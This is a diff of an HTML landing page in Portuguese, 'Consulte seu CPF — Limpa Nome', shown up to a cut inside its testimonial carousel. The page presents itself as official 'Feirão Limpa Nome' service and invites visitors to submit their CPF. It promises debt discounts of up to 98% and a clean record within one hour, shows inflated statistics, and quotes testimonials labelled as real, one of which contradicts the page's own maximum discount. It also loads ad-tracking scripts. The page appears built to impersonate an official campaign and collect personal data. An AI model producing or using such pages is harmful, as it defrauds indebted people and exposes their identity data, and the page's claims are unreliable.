@@ -1,137 +1,974 @@
-
-<!doctype html>
+<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Consulta Online — V L Comercial</title>
-<meta name="description" content="Acesse sua consulta online de forma rápida e segura." />
-<script src="https://cdn.tailwindcss.com"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Consulte seu CPF — Limpa Nome</title>
+<meta name="description" content="Verifique se há pendências em seu nome e descubra como regularizar seu CPF. Consulta rápida, gratuita e 100% online.">
+<meta name="robots" content="index, follow">
+
+<!-- Open Graph / WhatsApp -->
+<meta property="og:type" content="website">
+<meta property="og:title" content="Consulte seu CPF — Regularize suas pendências">
+<meta property="og:description" content="Descubra se há pendências em seu nome e negocie com descontos de até 98%. Atendimento oficial do Feirão Limpa Nome.">
+<meta property="og:locale" content="pt_BR">
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async defer
+></script>
 <script>
-  tailwind.config = {
-    theme: {
-      extend: {
-        colors: {
-          brand: {
-            50:'#fff1f6',100:'#ffe4ee',200:'#fecdd9',300:'#fda4bd',
-            400:'#fb7199',500:'#f43f73',600:'#e11d57',700:'#be1247',
-            800:'#9d1240',900:'#83143b'
-          }
-        }
-      }
+  window.googlePixelId = "6a10fecb7e753887446077bd";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script>
+<script src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js" data-token="30eef61a-f3d1-4abb-968c-495d4833f91e"></script>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+<style>
+  :root {
+    --pink: #ec0978;
+    --pink-600: #d0086c;
+    --pink-700: #a70654;
+    --pink-50: #fff4fa;
+    --pink-100: #fce7f3;
+    --ink: #0f172a;
+    --ink-2: #334155;
+    --muted: #6b7280;
+    --line: rgba(17,24,39,.08);
+    --green: #15803d;
+    --green-50: #f0fdf4;
+    --yellow: #f59e0b;
+  }
+  *, ::before, ::after { box-sizing: border-box; margin: 0; padding: 0 }
+  html { height: 100%; scroll-behavior: smooth }
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    color: var(--ink);
+    background: #fafafa;
+    -webkit-font-smoothing: antialiased;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* ─────────────── Header ─────────────── */
+  .topbar {
+    position: sticky; top: 0; z-index: 50;
+    background: var(--pink);
+    padding: 12px 20px;
+    box-shadow: 0 2px 8px rgba(236,9,120,.15);
+  }
+  .topbar-inner {
+    max-width: 1100px; margin: 0 auto;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px;
+  }
+  .brand { display: flex; align-items: center }
+  .brand img {
+    height: 40px; width: auto; display: block;
+    filter: brightness(0) invert(1);
+  }
+  .tag-feirao {
+    display: inline-flex; align-items: center; gap: 6px;
+    padding: 6px 12px;
+    background: rgba(255,255,255,.18);
+    border-radius: 99px;
+    color: #fff; font-size: 11.5px; font-weight: 600; letter-spacing: .02em;
+  }
+  .tag-feirao img { height: 14px; width: auto }
+
+  /* ─────────────── Hero ─────────────── */
+  .hero {
+    background: linear-gradient(145deg,#fdf2f8 0%,#fce7f3 50%,#fdf2f8 100%);
+    padding: 36px 20px 48px;
+    position: relative;
+    overflow: hidden;
+  }
+  .hero::before {
+    content: ""; position: absolute;
+    top: -120px; right: -80px;
+    width: 320px; height: 320px;
+    background: radial-gradient(circle, rgba(236,9,120,.12) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .hero-inner {
+    max-width: 1100px; margin: 0 auto;
+    display: grid; gap: 24px;
+    align-items: center;
+    position: relative;
+  }
+  .hero-top { text-align: center }
+  .hero-bottom { text-align: center }
+  .hero-badge {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: var(--green-50); color: var(--green);
+    padding: 6px 14px; border-radius: 99px;
+    font-size: 11.5px; font-weight: 600; letter-spacing: .04em;
+    border: 1px solid #bbf7d0;
+    margin-bottom: 16px;
+  }
+  h1 {
+    font-size: clamp(26px, 6.5vw, 44px);
+    font-weight: 800;
+    letter-spacing: -.03em;
+    line-height: 1.15;
+    color: var(--ink);
+    margin-bottom: 14px;
+  }
+  h1 .accent { color: var(--pink) }
+  .lead {
+    font-size: clamp(14.5px, 3.2vw, 17px);
+    color: var(--ink-2);
+    line-height: 1.55;
+    margin-bottom: 26px;
+    max-width: 540px;
+    margin-left: auto; margin-right: auto;
+  }
+  .hero-img-wrap {
+    width: 100%;
+    max-width: 440px;
+    margin: 0 auto;
+    background: linear-gradient(135deg, #fff0f6 0%, #fce7f3 100%);
+    border-radius: 20px; padding: 20px 16px; overflow: hidden;
+    box-shadow: 0 10px 30px rgba(236,9,120,.12);
+  }
+  .hero-img { width: 100%; max-width: 360px; height: auto; display: block; margin: 0 auto }
+
+  .btn-cta {
+    display: inline-flex; align-items: center; justify-content: center;
+    gap: 10px;
+    padding: 18px 28px;
+    background: linear-gradient(180deg, var(--pink) 0%, var(--pink-600) 100%);
+    color: #fff;
+    border: none; border-radius: 14px;
+    font-family: 'Inter', system-ui, sans-serif;
+    font-size: 16px; font-weight: 800;
+    letter-spacing: -.005em;
+    cursor: pointer;
+    box-shadow: 0 6px 18px rgba(236,9,120,.35);
+    transition: transform .15s, box-shadow .25s;
+    text-decoration: none;
+    width: 100%; max-width: 400px;
+  }
+  .btn-cta:hover { transform: translateY(-2px); box-shadow: 0 10px 24px rgba(236,9,120,.45) }
+  .btn-cta:active { transform: translateY(0) }
+  .btn-cta svg { flex-shrink: 0 }
+
+  .cta-note {
+    margin-top: 12px; font-size: 12px; color: var(--muted);
+    display: flex; align-items: center; justify-content: center;
+    gap: 12px; flex-wrap: wrap;
+  }
+  .cta-note span { display: inline-flex; align-items: center; gap: 5px }
+  .cta-note .dot { color: #d1d5db }
+
+  /* ─────────────── Stats (faixa de numeros) ─────────────── */
+  .stats {
+    background: #fff;
+    padding: 28px 20px;
+    border-top: 1px solid var(--line);
+    border-bottom: 1px solid var(--line);
+  }
+  .stats-inner {
+    max-width: 1100px; margin: 0 auto;
+    display: grid; grid-template-columns: repeat(3, 1fr); gap: 18px;
+  }
+  .stat { text-align: center }
+  .stat-num {
+    font-size: clamp(22px, 5vw, 32px);
+    font-weight: 800; color: var(--pink);
+    letter-spacing: -.02em; line-height: 1;
+    margin-bottom: 4px;
+  }
+  .stat-label {
+    font-size: clamp(11px, 2.5vw, 13px);
+    color: var(--muted);
+    font-weight: 500;
+  }
+
+  /* ─────────────── Sections genéricas ─────────────── */
+  .section {
+    padding: 48px 20px;
+    max-width: 1100px;
+    margin: 0 auto;
+  }
+  .section-eyebrow {
+    display: block; text-align: center;
+    font-size: 12px; font-weight: 700;
+    color: var(--pink);
+    text-transform: uppercase; letter-spacing: .1em;
+    margin-bottom: 8px;
+  }
+  .section-title {
+    text-align: center;
+    font-size: clamp(22px, 5vw, 32px);
+    font-weight: 800;
+    letter-spacing: -.02em;
+    line-height: 1.2;
+    margin-bottom: 10px;
+    color: var(--ink);
+  }
+  .section-sub {
+    text-align: center;
+    font-size: clamp(13.5px, 3vw, 15.5px);
+    color: var(--muted);
+    line-height: 1.5;
+    max-width: 580px;
+    margin: 0 auto 32px;
+  }
+
+  /* ─────────────── Como funciona (steps) ─────────────── */
+  .steps-grid {
+    display: grid; gap: 16px;
+  }
+  .step-card {
+    background: #fff;
+    border-radius: 16px;
+    padding: 24px 22px;
+    border: 1px solid var(--line);
+    box-shadow: 0 2px 6px rgba(0,0,0,.02);
+    transition: transform .25s, box-shadow .25s;
+    position: relative;
+  }
+  .step-card:hover { transform: translateY(-3px); box-shadow: 0 10px 24px rgba(236,9,120,.08) }
+  .step-icon {
+    width: 52px; height: 52px; border-radius: 14px;
+    background: var(--pink-50);
+    color: var(--pink);
+    display: grid; place-items: center;
+    margin-bottom: 14px;
+    border: 1.5px solid rgba(236,9,120,.12);
+  }
+  .step-icon svg { width: 26px; height: 26px }
+  .step-num-tag {
+    position: absolute; top: 18px; right: 20px;
+    font-size: 11px; font-weight: 800;
+    color: var(--pink); opacity: .3;
+    letter-spacing: .08em;
+  }
+  .step-h {
+    font-size: 17px; font-weight: 700;
+    color: var(--ink); margin-bottom: 6px;
+  }
+  .step-p {
+    font-size: 13.5px; color: var(--muted);
+    line-height: 1.55;
+  }
+
+  /* ─────────────── 3D Featured banner ─────────────── */
+  .featured-wrap {
+    padding: 0 20px;
+    max-width: 1100px; margin: 0 auto;
+    perspective: 1000px;
+  }
+  .featured {
+    background: linear-gradient(135deg, var(--pink) 0%, var(--pink-600) 50%, var(--pink-700) 100%);
+    border-radius: 22px;
+    padding: 40px 32px;
+    color: #fff;
+    position: relative;
+    overflow: hidden;
+    transform: rotateX(2deg);
+    box-shadow:
+      0 2px 0 rgba(255,255,255,.15) inset,
+      0 -4px 0 rgba(0,0,0,.18) inset,
+      0 20px 40px rgba(236,9,120,.30),
+      0 40px 80px rgba(236,9,120,.15);
+    transition: transform .4s cubic-bezier(.2,.8,.2,1);
+  }
+  .featured:hover { transform: rotateX(0deg) translateY(-4px) }
+  .featured::before {
+    content: ""; position: absolute;
+    top: -50%; left: -20%;
+    width: 140%; height: 200%;
+    background: repeating-linear-gradient(
+      -45deg,
+      rgba(255,255,255,.04) 0,
+      rgba(255,255,255,.04) 2px,
+      transparent 2px,
+      transparent 40px
+    );
+    pointer-events: none;
+  }
+  .featured-content { position: relative; z-index: 1; text-align: center }
+  .featured-tag {
+    display: inline-block;
+    padding: 6px 14px; border-radius: 99px;
+    background: rgba(0,0,0,.25);
+    font-size: 11px; font-weight: 700;
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    margin-bottom: 16px;
+    -webkit-backdrop-filter: blur(4px);
+    backdrop-filter: blur(4px);
+  }
+  .featured-title {
+    font-size: clamp(28px, 7vw, 48px);
+    font-weight: 900;
+    letter-spacing: -.04em;
+    line-height: 1;
+    margin-bottom: 8px;
+    text-shadow:
+      0 2px 0 rgba(0,0,0,.2),
+      0 4px 12px rgba(0,0,0,.3);
+  }
+  .featured-sub {
+    font-size: clamp(14px, 3vw, 17px);
+    opacity: .92;
+    margin-bottom: 22px;
+    line-height: 1.5;
+  }
+  .featured-discount {
+    display: inline-block;
+    font-size: clamp(36px, 9vw, 64px);
+    font-weight: 900;
+    letter-spacing: -.04em;
+    background: linear-gradient(180deg, #ffd800 0%, #f59e0b 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    text-shadow: none;
+    line-height: 1;
+    margin-bottom: 4px;
+  }
+  .featured-discount-label {
+    font-size: 12px; opacity: .85; font-weight: 600;
+    letter-spacing: .1em; text-transform: uppercase;
+  }
+
+  /* ─────────────── Depoimentos carousel ─────────────── */
+  .testimonials {
+    background: #fff;
+    padding: 48px 0;
+    border-top: 1px solid var(--line);
+    border-bottom: 1px solid var(--line);
+    overflow: hidden;
+  }
+  .testimonials-inner { max-width: 1100px; margin: 0 auto; padding: 0 20px }
+  .tm-track-wrap { overflow: hidden; position: relative }
+  .tm-track {
+    display: flex; gap: 16px;
+    transition: transform .45s cubic-bezier(.2,.8,.2,1);
+    will-change: transform;
+  }
+  .tm-card {
+    flex: 0 0 100%;
+    background: #fff;
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 24px 22px;
+    box-shadow: 0 2px 8px rgba(0,0,0,.03);
+  }
+  .tm-stars {
+    display: flex; gap: 2px; margin-bottom: 12px;
+    color: var(--yellow);
+  }
+  .tm-stars svg { width: 14px; height: 14px }
+  .tm-quote {
+    font-size: 14.5px; color: var(--ink-2);
+    line-height: 1.6; margin-bottom: 16px;
+    font-style: italic;
+  }
+  .tm-author {
+    display: flex; align-items: center; gap: 12px;
+    padding-top: 14px; border-top: 1px solid var(--line);
+  }
+  .tm-avatar {
+    width: 40px; height: 40px; border-radius: 50%;
+    background: linear-gradient(135deg, var(--pink) 0%, var(--pink-600) 100%);
+    color: #fff; font-weight: 700; font-size: 14px;
+    display: grid; place-items: center;
+    flex-shrink: 0;
+  }
+  .tm-name { font-weight: 700; font-size: 13.5px; color: var(--ink) }
+  .tm-loc  { font-size: 11.5px; color: var(--muted); display: flex; align-items: center; gap: 4px }
+
+  .tm-controls {
+    display: flex; align-items: center; justify-content: center;
+    gap: 14px; margin-top: 20px;
+  }
+  .tm-arrow {
+    width: 40px; height: 40px; border-radius: 50%;
+    background: #fff; border: 1.5px solid var(--line);
+    color: var(--ink);
+    display: grid; place-items: center;
+    cursor: pointer;
+    transition: border-color .2s, background .2s, transform .15s;
+  }
+  .tm-arrow:hover { border-color: var(--pink); color: var(--pink) }
+  .tm-arrow:active { transform: scale(.96) }
+  .tm-dots { display: flex; gap: 6px }
+  .tm-dot {
+    width: 7px; height: 7px; border-radius: 50%;
+    background: var(--line);
+    cursor: pointer; transition: background .2s, width .2s;
+  }
+  .tm-dot.active { background: var(--pink); width: 22px; border-radius: 99px }
+
+  /* ─────────────── FAQ ─────────────── */
+  .faq-list { max-width: 720px; margin: 0 auto; display: grid; gap: 10px }
+  .faq-item {
+    background: #fff;
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    overflow: hidden;
+    transition: border-color .25s, box-shadow .25s;
+  }
+  .faq-item[open] { border-color: rgba(236,9,120,.2); box-shadow: 0 4px 14px rgba(236,9,120,.06) }
+  .faq-summary {
+    padding: 18px 22px;
+    font-size: 14.5px; font-weight: 600;
+    color: var(--ink);
+    cursor: pointer;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px;
+    list-style: none;
+  }
+  .faq-summary::-webkit-details-marker { display: none }
+  .faq-summary::after {
+    content: ""; flex-shrink: 0;
+    width: 18px; height: 18px;
+    background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' stroke='%23ec0978' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round' viewBox='0 0 24 24'%3E%3Cpolyline points='6 9 12 15 18 9'/%3E%3C/svg%3E") no-repeat center;
+    transition: transform .3s;
+  }
+  .faq-item[open] .faq-summary::after { transform: rotate(180deg) }
+  .faq-content {
+    padding: 0 22px 20px;
+    font-size: 14px; color: var(--muted);
+    line-height: 1.6;
+  }
+
+  /* ─────────────── Trust / Segurança ─────────────── */
+  .trust {
+    background: #f8fafc;
+    padding: 48px 20px;
+    border-top: 1px solid var(--line);
+  }
+  .trust-grid {
+    max-width: 1100px; margin: 0 auto;
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 24px;
+  }
+  .trust-item {
+    text-align: center;
+    padding: 24px;
+  }
+  .trust-icon {
+    width: 48px; height: 48px; margin: 0 auto 16px;
+    color: var(--pink); opacity: .8;
+  }
+  .trust-h { font-size: 15px; font-weight: 700; margin-bottom: 6px; color: var(--ink) }
+  .trust-p { font-size: 13px; color: var(--muted); line-height: 1.5 }
+
+  /* ─────────────── Footer ─────────────── */
+  .footer {
+    background: #0f172a;
+    padding: 64px 20px 32px;
+    color: #fff;
+  }
+  .footer-inner {
+    max-width: 1100px; margin: 0 auto;
+    display: grid; gap: 48px;
+  }
+  .footer-brand {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    gap: 12px;
+    max-width: 320px;
+  }
+  .footer-logo {
+    height: 40px; width: auto;
+    max-width: 120px;
+    object-fit: contain;
+    flex: 0 0 auto;
+    align-self: flex-start;
+    filter: brightness(0) invert(1); opacity: .95;
+  }
+  .footer-about {
+    font-size: 12.5px; color: #94a3b8; line-height: 1.6;
+  }
+  .footer-col h4 {
+    font-size: 11.5px; font-weight: 700;
+    color: #fff; text-transform: uppercase; letter-spacing: .1em;
+    margin-bottom: 14px;
+  }
+  .footer-col ul { list-style: none; display: grid; gap: 9px }
+  .footer-col a {
+    color: #cbd5e1; text-decoration: none;
+    font-size: 13px;
+    transition: color .2s;
+    display: inline-flex; align-items: center; gap: 6px;
+  }
+  .footer-col a:hover { color: var(--pink) }
+  .footer-contact { display: grid; gap: 10px }
+  .footer-contact-item {
+    display: flex; align-items: flex-start; gap: 10px;
+    font-size: 12.5px; color: #94a3b8; line-height: 1.5;
+  }
+  .footer-contact-item svg { color: var(--pink); flex-shrink: 0; margin-top: 2px }
+  .footer-bottom {
+    margin-top: 32px; padding-top: 20px;
+    border-top: 1px solid rgba(255,255,255,.08);
+    display: flex; justify-content: space-between; flex-wrap: wrap; gap: 12px;
+    font-size: 11.5px; color: #64748b;
+  }
+  .footer-legal { max-width: 640px; line-height: 1.5 }
+  .footer-socials { display: flex; gap: 8px }
+  .footer-socials a {
+    width: 32px; height: 32px; border-radius: 50%;
+    background: rgba(255,255,255,.06);
+    display: grid; place-items: center;
+    color: #cbd5e1;
+    transition: background .2s, color .2s;
+  }
+  .footer-socials a:hover { background: var(--pink); color: #fff }
+
+  /* ─────────────── Desktop responsive ─────────────── */
+  @media (min-width: 720px) {
+    .hero { padding: 56px 28px 72px }
+    .hero-inner {
+      grid-template-columns: 1.15fr 1fr;
+      grid-template-rows: auto auto;
+      gap: 24px 48px;
+    }
+    .hero-top    { grid-column: 1; grid-row: 1; text-align: left; align-self: end }
+    .hero-bottom { grid-column: 1; grid-row: 2; text-align: left; align-self: start }
+    .hero-img-wrap {
+      grid-column: 2; grid-row: 1 / 3;
+      max-width: 460px;
+      justify-self: center;
+      align-self: center;
+    }
+    .hero-img { max-width: 380px }
+    .lead { margin-left: 0; margin-right: 0 }
+    .btn-cta { width: auto; max-width: none }
+    .cta-note { justify-content: flex-start }
+    .steps-grid { grid-template-columns: repeat(3, 1fr) }
+    .tm-card { flex: 0 0 calc(50% - 8px) }
+    .footer-inner {
+      grid-template-columns: 2fr 1fr 1fr 1.2fr;
+      gap: 40px;
     }
   }
-</script>
-<style>
-  body { font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
+  @media (min-width: 1000px) {
+    .tm-card { flex: 0 0 calc(33.333% - 11px) }
+  }
+
+  /* ─────────────── Animações ─────────────── */
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(14px) }
+    to   { opacity: 1; transform: translateY(0) }
+  }
+  .hero-text, .hero-img-wrap, .stat, .step-card, .featured, .faq-list, .trust-item {
+    animation: fadeUp .5s ease both;
+  }
+  .stat:nth-child(2) { animation-delay: .08s }
+  .stat:nth-child(3) { animation-delay: .16s }
+  .step-card:nth-child(2) { animation-delay: .08s }
+  .step-card:nth-child(3) { animation-delay: .16s }
 </style>
 </head>
-<body class="min-h-screen bg-gradient-to-b from-brand-50 via-white to-brand-50 text-slate-800">
+<body>
 
-  <header class="mx-auto max-w-3xl flex items-center justify-between px-6 py-5">
-    <div class="flex items-center gap-2">
-      <div class="h-9 w-9 rounded-xl bg-brand-500 text-white flex items-center justify-center font-bold">V</div>
-      <span class="font-semibold">V L Comercial</span>
+  <!-- ═══════════ Header ═══════════ -->
+  <header class="topbar">
+    <div class="topbar-inner">
+      <div class="tag-feirao">
+        <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663304183709/niRZDrggAaZWXjkq.png" alt="Feirão Limpa Nome">
+        Feirão Limpa Nome
+      </div>
     </div>
-    <span class="hidden sm:inline text-xs text-slate-500">Consulta Online</span>
   </header>
 
-  <main class="mx-auto max-w-2xl px-6 pb-16 pt-6">
-    <section class="rounded-3xl bg-white p-8 sm:p-10 shadow-xl shadow-brand-200/50 ring-1 ring-brand-100">
-      <div class="mb-6 inline-flex items-center gap-2 rounded-full bg-brand-100 text-brand-700 px-3 py-1 text-xs font-medium">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-        Acesso seguro e gratuito
+  <!-- ═══════════ Hero ═══════════ -->
+  <section class="hero">
+    <div class="hero-inner">
+      <div class="hero-top">
+        <span class="hero-badge">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          Consulta Gratuita
+        </span>
+        <h1>Consulte seu CPF e <span class="accent">regularize</span> suas pendências</h1>
+        <p class="lead">
+          Verifique se há pendências em seu nome e descubra como regularizar sua situação com
+          descontos de até 98% em dívidas negativadas.
+        </p>
+      </div>
+      <div class="hero-img-wrap">
+        <img class="hero-img" src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663304183709/PXfzNyKnMlxjTRdT.jpg" alt="Pessoa consultando CPF pelo celular">
+      </div>
+      <div class="hero-bottom">
+        <button id="ctaStart" class="btn-cta" type="button">
+          Consultar meu CPF grátis
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+        </button>
+        <div class="cta-note">
+          <span><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>Gratuito</span>
+          <span class="dot">·</span>
+          <span><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>Não afeta seu score</span>
+          <span class="dot">·</span>
+          <span><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>LGPD</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════ Stats ═══════════ -->
+  <section class="stats">
+    <div class="stats-inner">
+      <div class="stat">
+        <div class="stat-num">7M+</div>
+        <div class="stat-label">Brasileiros atendidos</div>
+      </div>
+      <div class="stat">
+        <div class="stat-num">R$ 34M</div>
+        <div class="stat-label">Em dívidas renegociadas</div>
+      </div>
+      <div class="stat">
+        <div class="stat-num">98%</div>
+        <div class="stat-label">De desconto máximo</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════ Como funciona ═══════════ -->
+  <section class="section" id="como-funciona">
+    <span class="section-eyebrow">Como funciona</span>
+    <h2 class="section-title">Regularize em 3 passos simples</h2>
+    <p class="section-sub">Processo 100% online, rápido e seguro. Sem filas, sem papelada.</p>
+
+    <div class="steps-grid">
+      <div class="step-card">
+        <span class="step-num-tag">PASSO 1</span>
+        <div class="step-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
+        </div>
+        <div class="step-h">Consulte seu CPF</div>
+        <p class="step-p">Informe seu CPF e faremos uma análise completa da sua situação no sistema. Consulta gratuita, em segundos.</p>
       </div>
 
-      <h1 class="text-3xl sm:text-4xl font-bold leading-tight text-slate-900">
-        Sua consulta online está pronta
-      </h1>
-      <p class="mt-4 text-slate-600">
-        Confirme abaixo para acessar a próxima etapa. O processo é simples, rápido e totalmente online.
-      </p>
-
-      <ul class="my-8 space-y-3 text-sm">
-        <li class="flex items-start gap-3"><span class="text-brand-500">✓</span> Acesso 100% online e gratuito</li>
-        <li class="flex items-start gap-3"><span class="text-brand-500">✓</span> Atendimento em conformidade com a LGPD</li>
-        <li class="flex items-start gap-3"><span class="text-brand-500">✓</span> Disponível 24 horas por dia</li>
-      </ul>
-
-      <!-- Slide to confirm -->
-      <div id="track" class="relative h-16 w-full select-none overflow-hidden rounded-full bg-brand-100 shadow-inner">
-        <div id="label" class="pointer-events-none absolute inset-0 flex items-center justify-center text-sm font-semibold uppercase tracking-wider text-brand-700">
-          Arraste para continuar →
+      <div class="step-card">
+        <span class="step-num-tag">PASSO 2</span>
+        <div class="step-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
         </div>
-        <button id="thumb" type="button" aria-label="Arraste para continuar"
-          class="absolute top-1 left-1 h-14 w-14 rounded-full bg-brand-500 text-white shadow-lg flex items-center justify-center active:bg-brand-600"
-          style="touch-action:none;">
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="7 6 13 12 7 18"/><polyline points="13 6 19 12 13 18"/></svg>
+        <div class="step-h">Veja suas propostas</div>
+        <p class="step-p">Apresentamos as melhores condições disponíveis do mercado, com descontos de até 98% em dívidas ativas.</p>
+      </div>
+
+      <div class="step-card">
+        <span class="step-num-tag">PASSO 3</span>
+        <div class="step-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+        </div>
+        <div class="step-h">Nome limpo em 1h</div>
+        <p class="step-p">Após confirmar, seu CPF é regularizado em até 1 hora no sistema. Sem burocracia, 100% digital.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════ Featured banner 3D ═══════════ -->
+  <div class="featured-wrap">
+    <div class="featured">
+      <div class="featured-content">
+        <span class="featured-tag">Oferta Lendária do Feirão</span>
+        <div class="featured-title">LIMPA NOME</div>
+        <p class="featured-sub">Descontos históricos para quitar dívidas antigas</p>
+        <div class="featured-discount">98%</div>
+        <div class="featured-discount-label">De desconto para você</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════ Depoimentos ═══════════ -->
+  <section class="testimonials">
+    <div class="testimonials-inner">
+      <span class="section-eyebrow">Depoimentos reais</span>
+      <h2 class="section-title">Com a palavra: quem limpou o nome</h2>
+      <p class="section-sub">Milhares de brasileiros já recuperaram seu crédito. Veja algumas histórias.</p>
+
+      <div class="tm-track-wrap">
+        <div class="tm-track" id="tmTrack">
+
+          <article class="tm-card">
+            <div class="tm-stars">
+              <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+              <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+              <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+              <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+              <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+            </div>
+            <p class="tm-quote">"Minha dívida estava em torno de R$ 25 mil. Com 99% de desconto, quitei praticamente tudo. Agora posso ser um cidadão com o nome limpo e isso é gratificante!"</p>
+            <div class="tm-author">
+              <div class="tm-avatar">AC</div>
+              <div>
+                <div class="tm-name">Almir Carlos da Silva</div>
+                <div class="tm-loc"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>Cliente de nome limpo</div>
+              </div>
+            </div>
+          </article>
+
+          <article class="tm-card">
+            <div class="tm-stars">
+              <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+              <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+              <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+              <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+              <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+            </div>
